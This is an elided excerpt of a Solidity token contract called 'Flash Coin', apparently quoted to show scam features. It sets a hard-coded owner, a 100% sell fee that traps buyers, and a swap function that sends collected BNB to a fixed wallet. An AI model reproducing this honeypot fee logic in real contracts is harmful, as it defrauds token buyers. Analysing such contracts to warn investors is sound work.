...
abstract contract Ownable is Context {
    ...
    constructor () {
         _owner = 0xf47edbB128b49F97b165eE8B6C43Fc2F739034f3;
...
contract FlashCoin is Context, IERC20, Ownable { 
    ...
    string private constant _name = unicode"Flash Coin"; 
    string private constant _symbol = unicode"FHC"; 
    ...
    uint256 public _SellFee = 1000; //100%
 ...
 function _transwertoken(address sender, address receivaddr, uint256 tAmount) private {
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            sendToWallet(payable(0x72Ddf57efc0ac2E8dbC88E87179c5f7A9dE3C083), BNB_Tot);
            }
